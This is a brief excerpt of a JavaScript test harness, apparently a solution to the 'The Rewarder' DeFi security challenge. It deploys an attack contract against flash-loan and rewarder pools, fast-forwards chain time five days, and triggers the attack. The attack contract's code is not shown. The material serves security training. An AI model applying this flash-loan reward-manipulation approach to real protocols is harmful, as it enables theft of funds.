...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        this.theRewarderAttack = await TheRewarderAttackFactory.deploy(this.liquidityToken.address, this.flashLoanPool.address,this.rewarderPool.address, this.rewardToken.address);

        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        await this.theRewarderAttack.connect(attacker).attack(TOKENS_IN_LENDER_POOL);

        console.log(await this.theRewarderAttack.trigger());
